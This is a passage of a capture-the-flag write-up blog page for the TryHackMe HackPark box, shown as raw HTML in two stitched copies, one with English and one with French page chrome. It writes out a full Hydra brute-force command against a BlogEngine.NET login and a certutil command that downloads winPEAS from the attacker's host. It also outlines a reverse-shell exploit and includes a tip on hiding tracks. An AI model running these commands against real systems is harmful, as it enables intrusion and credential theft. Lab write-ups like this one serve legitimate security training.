:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Burp_History.png data-srcset="/images/2021/02/HackPark_Burp_History.png, /images/2021/02/HackPark_Burp_History.png 1.5x, /images/2021/02/HackPark_Burp_History.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Burp_History.png title="HackPark Proxy History Version"></p><p>Then, I&rsquo;ll try to attack it like this :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.106.193 http-post-form &#34;/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=Q6%2Fwyy29Lyg61L12FTfXHvmaqgecBgtXUIRuiIVZJcFGpkb5tUJh93nSVJyuTgOfHtyLi9OgrKHFNl1seijcfd5djPWqvYuL6snvmS5V63eSntNGRbmzESEkm6ktoT2Dte8ynazWqXYY2eHuMMAEfJW605kE5c0VpnhTqNIq0L2E%2FkNX&amp;__EVENTVALIDATION=gvR4CPW1DPVTT4Sm1GtfP5izsS5fJPp9bKo0SKI3XahFdVSdCQszWrKRTgWPFKxEICXK4t8lOn0TU0fheh7qDW4tv5IcHTzcIQ3ZVX8Mup8bVrtQVspuQDJhG%2B8j5lpl2zcnQjaPXY%2FfwjBMZou39tlG7J8yzxpVlOiY%2BkR3Vd0caNnr&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed&#34; -vV
-</code></pre></div><p>After a few seconds, with a good wordlist, it will find the password :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Hydra_Pass.png data-srcset="/images/2021/02/HackPark_Hydra_Pass.png, /images/2021/02/HackPark_Hydra_Pass.png 1.5x, /images/2021/02/HackPark_Hydra_Pass.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Hydra_Pass.png title="HackPark Hydra Pass"></p><p>It is time to play with our Authenticated RCEs!</p><h2 id=exploitation>Exploitation</h2><h3 id=getting-initial-shell>Getting initial shell</h3><p>This <a href=https://www.exploit-db.com/exploits/46353 target=_blank rel="noopener noreffer">RCE</a> seems to apply to our target and is well written, it explains step by step how to exploit it :</p><ol start=0><li>Setup <code>netcat</code> listener on our attacking box ;</li><li>We create a file called <code>PostView.ascx</code> and modify it with the IP and port of our attacking box ;</li><li>Upload it ;</li><li>Visit URL to trigger to remote shell.</li></ol><p>And it worked :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Initial_Shell.png data-srcset="/images/2021/02/HackPark_Initial_Shell.png, /images/2021/02/HackPark_Initial_Shell.png 1.5x, /images/2021/02/HackPark_Initial_Shell.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Initial_Shell.png title="HackPark Initial Shell"></p><p>Unfortunately, we are not <code>SYSTEM</code>. Like we guessed during recon, we&rsquo;ll have to elevate our priv.</p><h3 id=privesc>PrivEsc</h3><p>Let&rsquo;s get <code>WinPEAS</code> on our target. I like to use <code>winPEAS.bat</code> and upload via my own machine, serving it with Python module <code>SimpleHTTPServer</code>. Then, I&rsquo;ll download in on target with the following command:</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
-</code></pre></div><p>NB : make sure to use a writable folder, such as: <code>C:\Users\Public</code>.</p><p>We run it with :</p><div class=highlight><pre class=chroma><code class=language-text data-lang=text>winPEAS.bat log
-</code></pre></div><p>The <code>log</code> switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you &ldquo;quieter&rdquo;, which is want you probably want.</p><p>WinPEAS will reveal some <code>Administrator credentials</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_Pass.png data-srcset="/images/2021/02/HackPark_Admin_Pass.png, /images/2021/02/HackPark_Admin_Pass.png 1.5x, /images/2021/02/HackPark_Admin_Pass.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Admin_Pass.png title="HackPark Admin Pass"></p><p>We try them in RDP, and boom! We are in as <code>SYSTEM</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_RDP.png data-srcset="/images/2021/02/HackPark_Admin_RDP.png, /images/2021/02/HackPark_Admin_RDP.png 1.5x, /images/2021/02/HackPark_Admin_RDP.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Admin_RDP.png title="HackPark Admin RDP"></p><p>Let&rsquo;s harvest our flags, first user :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_User_Flag.png data-srcset="/images/2021/02/HackPark_User_Flag.png, /images/2021/02/HackPark_User_Flag.png 1.5x, /images/2021/02/HackPark_User_Flag.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_User_Flag.png title="HackPark User Flag"></p><p>Then root:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Root_Flag.png data-srcset="/images/2021/02/HackPark_Root_Flag.png, /images/2021/02/HackPark_Root_Flag.png 1.5x, /images/2021/02/HackPark_Root_Flag.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Root_Flag.png title="HackPark Root Flag"></p><h2 id=outro>Outro</h2><p>In this box, we learned how to use <code>Hydra</code> for credentials cracking and practiced what we&rsquo;ve already been doing before to escalate privileges. A cool little box!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Updated on 2021-02-21</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/thm/>THM</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>Back</a></span>&nbsp;|&nbsp;<span><a href=/>Home</a></span></section></div><div class=post-nav><a href=/htb-nibbles-without-metasploit/ class=prev rel=prev title="HTB - Nibbles without MetaSploit"><i class="fas fa-angle-left fa-fw"></i>HTB - Nibbles without MetaSploit</a>
-<a href=/thm-gamezone/ class=next rel=next title="THM - GameZone">THM - GameZone<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Powered by <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.79.1">Hugo</a> | Theme - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i>LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/ target=_blank>Denis</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Back to Top"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="View Comments"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
+</code></pre></td></tr></table></div></div><p>Checking <code>searchsploit</code> for vuln on <code>IIS 8.5</code> won&rsquo;t reveal anything.</p><p>In the meantime, manual browsing to the website tells us it is a blog, and it is running on <code>BlogEngine.NET</code> which seems to be an Open source blogging platform for ASP / Windows platforms.</p><p>Using <code>searchsploit</code>, we&rsquo;ll discover that some versions are vulnerable to various stuff (including RCE), however we do not know yet, our version.</p><p>However, by looking at the source code of the main page, we&rsquo;ll see that we are using <code>BlogEngine 3.3.6.0</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Blog_Version.png data-srcset="/images/2021/02/HackPark_Blog_Version.png, /images/2021/02/HackPark_Blog_Version.png 1.5x, /images/2021/02/HackPark_Blog_Version.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Blog_Version.png title="HackPark Blog Version"></p><p>This confirms that our target is vulnerable to RCEs! By reading the RCEs on <a href=https://www.exploit-db.com/ target=_blank rel="noopener noreffer">Exploit-DB</a>, we see that all of them require access to the admin panel, they are Authenticated RCE. I guess, this is where <code>Hydra</code> will come useful and the <code>http://10.10.144.161/admin</code> URL we found during our previous scans.</p><h3 id=cracking-authentication-with-burp>Cracking authentication with Burp</h3><p>By reading the &ldquo;Get Started with BlogEngine&rdquo;, we learn that default credentials are <code>admin</code> // <code>admin</code>. However, it doesn&rsquo;t work. We will assume that the password has been changed but not the user!</p><p>Before running <code>Hydra</code>, we need to gather URL parameter, I like to use <code>Burp</code> proxy history in order to do so :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Burp_History.png data-srcset="/images/2021/02/HackPark_Burp_History.png, /images/2021/02/HackPark_Burp_History.png 1.5x, /images/2021/02/HackPark_Burp_History.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Burp_History.png title="HackPark Proxy History Version"></p><p>Then, I&rsquo;ll try to attack it like this :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.106.193 http-post-form &#34;/Account/login.aspx?ReturnURL=%2fadmin:__VIEWSTATE=Q6%2Fwyy29Lyg61L12FTfXHvmaqgecBgtXUIRuiIVZJcFGpkb5tUJh93nSVJyuTgOfHtyLi9OgrKHFNl1seijcfd5djPWqvYuL6snvmS5V63eSntNGRbmzESEkm6ktoT2Dte8ynazWqXYY2eHuMMAEfJW605kE5c0VpnhTqNIq0L2E%2FkNX&amp;__EVENTVALIDATION=gvR4CPW1DPVTT4Sm1GtfP5izsS5fJPp9bKo0SKI3XahFdVSdCQszWrKRTgWPFKxEICXK4t8lOn0TU0fheh7qDW4tv5IcHTzcIQ3ZVX8Mup8bVrtQVspuQDJhG%2B8j5lpl2zcnQjaPXY%2FfwjBMZou39tlG7J8yzxpVlOiY%2BkR3Vd0caNnr&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:F=Login failed&#34; -vV
+</code></pre></td></tr></table></div></div><p>After a few seconds, with a good wordlist, it will find the password :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Hydra_Pass.png data-srcset="/images/2021/02/HackPark_Hydra_Pass.png, /images/2021/02/HackPark_Hydra_Pass.png 1.5x, /images/2021/02/HackPark_Hydra_Pass.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Hydra_Pass.png title="HackPark Hydra Pass"></p><p>It is time to play with our Authenticated RCEs!</p><h2 id=exploitation>Exploitation</h2><h3 id=getting-initial-shell>Getting initial shell</h3><p>This <a href=https://www.exploit-db.com/exploits/46353 target=_blank rel="noopener noreffer">RCE</a> seems to apply to our target and is well written, it explains step by step how to exploit it :</p><ol start=0><li>Setup <code>netcat</code> listener on our attacking box ;</li><li>We create a file called <code>PostView.ascx</code> and modify it with the IP and port of our attacking box ;</li><li>Upload it ;</li><li>Visit URL to trigger to remote shell.</li></ol><p>And it worked :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Initial_Shell.png data-srcset="/images/2021/02/HackPark_Initial_Shell.png, /images/2021/02/HackPark_Initial_Shell.png 1.5x, /images/2021/02/HackPark_Initial_Shell.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Initial_Shell.png title="HackPark Initial Shell"></p><p>Unfortunately, we are not <code>SYSTEM</code>. Like we guessed during recon, we&rsquo;ll have to elevate our priv.</p><h3 id=privesc>PrivEsc</h3><p>Let&rsquo;s get <code>WinPEAS</code> on our target. I like to use <code>winPEAS.bat</code> and upload via my own machine, serving it with Python module <code>SimpleHTTPServer</code>. Then, I&rsquo;ll download in on target with the following command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>certutil -urlcache -f http://10.11.27.240/winPEAS.bat winPEAS.bat
+</code></pre></td></tr></table></div></div><p>NB : make sure to use a writable folder, such as: <code>C:\Users\Public</code>.</p><p>We run it with :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre class=chroma><code class=language-text data-lang=text>winPEAS.bat log
+</code></pre></td></tr></table></div></div><p>The <code>log</code> switch will save output to a log file and display it. Since we are training, there is no problem in saving the log in the remote machine. However, on a real assessment where you could have to hide you tracks, it might be better to simply print the log and copy it manually in order to save it outside the target. In any case, like with scanning tools, it is preferred to run the tool only once and save output. It will make you &ldquo;quieter&rdquo;, which is want you probably want.</p><p>WinPEAS will reveal some <code>Administrator credentials</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_Pass.png data-srcset="/images/2021/02/HackPark_Admin_Pass.png, /images/2021/02/HackPark_Admin_Pass.png 1.5x, /images/2021/02/HackPark_Admin_Pass.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Admin_Pass.png title="HackPark Admin Pass"></p><p>We try them in RDP, and boom! We are in as <code>SYSTEM</code> :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Admin_RDP.png data-srcset="/images/2021/02/HackPark_Admin_RDP.png, /images/2021/02/HackPark_Admin_RDP.png 1.5x, /images/2021/02/HackPark_Admin_RDP.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Admin_RDP.png title="HackPark Admin RDP"></p><p>Let&rsquo;s harvest our flags, first user :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_User_Flag.png data-srcset="/images/2021/02/HackPark_User_Flag.png, /images/2021/02/HackPark_User_Flag.png 1.5x, /images/2021/02/HackPark_User_Flag.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_User_Flag.png title="HackPark User Flag"></p><p>Then root:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/images/2021/02/HackPark_Root_Flag.png data-srcset="/images/2021/02/HackPark_Root_Flag.png, /images/2021/02/HackPark_Root_Flag.png 1.5x, /images/2021/02/HackPark_Root_Flag.png 2x" data-sizes=auto alt=/images/2021/02/HackPark_Root_Flag.png title="HackPark Root Flag"></p><h2 id=outro>Outro</h2><p>In this box, we learned how to use <code>Hydra</code> for credentials cracking and practiced what we&rsquo;ve already been doing before to escalate privileges. A cool little box!</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>Mis à jour le 2021-02-21</span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="Partager sur Twitter" data-sharer=twitter data-url=https://www.masoopy.com/thm-hackpark-without-metasploit/ data-title="THM - HackPark without MetaSploit" data-via=nesousx data-hashtags=THM><i class="fab fa-twitter fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Linkedin" data-sharer=linkedin data-url=https://www.masoopy.com/thm-hackpark-without-metasploit/><i class="fab fa-linkedin fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Hacker News" data-sharer=hackernews data-url=https://www.masoopy.com/thm-hackpark-without-metasploit/ data-title="THM - HackPark without MetaSploit"><i class="fab fa-hacker-news fa-fw"></i></a><a href=javascript:void(0); title="Partager sur Reddit" data-sharer=reddit data-url=https://www.masoopy.com/thm-hackpark-without-metasploit/><i class="fab fa-reddit fa-fw"></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw"></i>&nbsp;<a href=/tags/thm/>THM</a></section><section><span><a href=javascript:void(0); onclick=window.history.back();>Retour</a></span>&nbsp;|&nbsp;<span><a href=/>Accueil</a></span></section></div><div class=post-nav><a href=/htb-nibbles-without-metasploit/ class=prev rel=prev title="HTB - Nibbles without MetaSploit"><i class="fas fa-angle-left fa-fw"></i>HTB - Nibbles without MetaSploit</a>
+<a href=/thm-gamezone/ class=next rel=next title="THM - GameZone">THM - GameZone<i class="fas fa-angle-right fa-fw"></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>Propulsé par <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.79.1">Hugo</a> | Thème - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i>LoveIt</a></div><div class=footer-line><i class="far fa-copyright fa-fw"></i><span itemprop=copyrightYear>2022</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=/about target=_blank>Denis G.</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title="Retour en Haut"><i class="fas fa-arrow-up fa-fw"></i></a><a href=# id=view-comments class=fixed-button title="Afficher les Commentaires"><i class="fas fa-comment fa-fw"></i></a></div><script type=text/javascript src=/lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=/lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=/lib/clipboard/clipboard.min.js></script><script type=text/javascript src=/lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":10},"comment":{}};</script><script type=text/javascript src=/js/theme.min.js></script></body></html>
